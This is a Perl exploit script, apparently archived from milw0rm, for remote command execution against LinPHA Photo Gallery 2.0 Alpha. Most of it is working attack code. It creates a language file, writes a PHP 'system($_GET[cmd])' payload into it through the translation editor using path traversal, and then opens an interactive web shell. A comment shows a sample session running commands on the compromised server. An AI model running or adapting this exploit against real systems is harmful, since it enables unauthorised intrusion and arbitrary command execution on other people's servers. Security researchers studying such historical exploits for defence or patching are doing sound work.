#!/usr/bin/perl

# -----------------------------------------------------------------------------------------------------------------------
#                      INFORMATIONS
# -----------------------------------------------------------------------------------------------------------------------
# LinPHA Photo Gallery 2.0 Alpha
# http://sourceforge.net/project/downloading.php?group_id=64772&use_mirror=heanet&filename=linpha2-alpha1.tar.gz&94291669
# Remote Command Execution Exploit
# by Osirys
# osirys[at]live[dot]it
# osirys.org

# Greets to: x0r, str0ke, emgent, and my big friend Jay
# Tested in local with: magic quotes => Off

# ------------------------------------------------------------------
# Exploit in action :D
# ------------------------------------------------------------------
# osirys[~]>$ perl rce.txt http://localhost/linpha2/
#
#   -------------------------------------------
#       LinPHA 2.0a Code Execution Exploit
#                 Coded by Osirys
#   -------------------------------------------
#
# [+] New Language added !
# [+] Editing new Language ..
# [+] New Language Edited !
# [*] Hi my master, execute your commands !
#
# shell[localhost]$> id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$> ls
# lang.freedom.php
# lang.freedom.php.bak
# language.php
# language.php~
# shell[localhost]$> pwd
# /home/osirys/web/linpha2/lib/lang
# shell[localhost]$> exit
# [-] Quitting ..
# osirys[~]>$
# ------------------------------------------------------------------

use LWP::UserAgent;
use IO::Socket;
use HTTP::Request::Common;

my $new_lang_name = "freedom";
my $add_lang_path = "/lib/lang/language.php?action=create_file";
my $edt_lang_path = "/lib/lang/language.php?action=edit_lang&language=";
my $rce_path      = "/lib/lang/lang".$new_lang_name.".php";
my $phpc0de       = "%22%29%3Bsystem%28%24_GET%5Bcmd%5D%29%3B%24a%3D+array%28%22";
my $i = 0;
my $c = 0;
my $host   = $ARGV[0];

($host) || help("-1");
cheek($host) == 1 || help("-2");
&banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

&new_lang_create($new_lang_name);

sub new_lang_create() {
    my $new_lang_name = $_[0];
    my $url = $host.$add_lang_path;

    my $ua = LWP::UserAgent->new;
    my $re = $ua->request(POST $url,
                                   Content_Type => 'form-data',
                                   Content      => [
                                                     filename => $new_lang_name,
                                                     action   => 'create_file',
                                                     submit   => 'submit'
                                                   ]
                         );

    if (($re->is_success)&&($re->as_string =~ /File already exists!/)) {
        $i++;
        print "[+] Language already exists, creating a new one ..\n";
        $new_lang_name = "freedom".$i;
        $edt_lang_path = "/lib/lang/language.php?action=edit_lang&language=".$new_lang_name;
        &new_lang_create($new_lang_name);
    }
    elsif (($re->is_success)&&($re->as_string =~ /Fine - now please go/)) {
        print "[+] New Language added !\n";
        &new_lang_edit($new_lang_name);
    }
    else {
        print "[-] Unable to add a new language\n";
        print "[-] Exploit Failed\n\n";
        exit(0);
    }
}

sub new_lang_edit() {
    my $new_lang_name = $_[0];
    my $url  = $path.$edt_lang_path;
    my $code = "phrase%5BAlbums%0D%0A%5D%5B%5D=".$phpc0de."&phrase%5BExtended+Search%0D%0A%5D%5B%5D=".
               "&phrase%5BHi%2C+this+is+the+home+of+%22The+PHP+Photo+Archive%22+%3Ca+href%3D%22http%".
               "3A%2F%2Flinpha.sf.net%22%3Eaka+LinPHA%3C%2Fa%3E.%0D%0A%5D%5B%5D=&phrase%5BHome%0D%0A".
               "%5D%5B%5D=&phrase%5BLinpha+Syslog%0D%0A%5D%5B%5D=&phrase%5BLogin%0D%0A%5D%5B%5D=&phr".
               "ase%5BPassword%0D%0A%5D%5B%5D=&phrase%5BRemember+Me%0D%0A%5D%5B%5D=&phrase%5BSearch%".
               "0D%0A%5D%5B%5D=&phrase%5BUsername%0D%0A%5D%5B%5D=&phrase%5BWelcome%0D%0A%5D%5B%5D=&p".
               "hrase%5BYou+must+have+cookies+enabled+to+log+in.%0D%0A%5D%5B%5D=&action=save_lang&la".
               "nguage=..%2F..%2Flib%2Flang%2Flang.".$new_lang_name.".php&submit=submit";
    my $length = length($code);
    my $data = "POST ".$url." HTTP/1.1\r\n".
               "Host: ".$h0st."\r\n".
               "Keep-Alive: 300\r\n".
               "Connection: keep-alive\r\n".
               "Content-Type: application/x-www-form-urlencoded\r\n".
               "Content-Length: ".$length."\r\n\r\n".
               $code."\r\n";

    my $socket   =  new IO::Socket::INET(
                                          PeerAddr => $h0st,
                                          PeerPort => '80',
                                          Proto    => 'tcp',
                                        ) or die "[-] Can't connect to $h0st:80\n[?] $! \n\n";

    print "[+] Editing new Language ..\n";
    $socket->send($data);

    while ((my $e = <$socket>)&&($inj_t != 1)) {
        if ($e =~ /Welcome To LinPHA2 Translation Module/) {
            print "[+] New Language Edited !\n";
            print "[*] Hi my master, execute your commands !\n\n";
            $inj_t = 1;
        }
    }
    $inj_t == 1 || die "[-] Unable to edit new Language ! \n";

    &exec_cmd($new_lang_name);
}

sub exec_cmd() {
    my $new_lang_name = $_[0];
    my @outs;
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print "shell[$h0st]\$> ";
    $cmd = <STDIN>;
    $cmd !~ /exit/ || die "[-] Quitting ..\n";
    $rce_path = "/lib/lang/lang.".$new_lang_name.".php";
    $exec_url = ($host.$rce_path."?cmd=".$cmd);
    $re = get_req($exec_url);
    if ($re =~ /(.*)/) {
        push(@outs,$re);
        foreach my $o(@outs) {
            print "$o";
        }
        &exec_cmd;
    }
    elsif ($re !~ /[a-z0-9]/) {
        $c++;
        print "bash: ".$cmd.": command not found\n";
        $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
        &exec_cmd;
    }
}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub banner {
    print "\n".
          "  ------------------------------------------- \n".
          "      LinPHA 2.0a Code Execution Exploit      \n".
          "                Coded by Osirys               \n".
          "  ------------------------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Bad hostname! \n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path\n\n";
    exit(0);
}

# milw0rm.com [2009-01-20]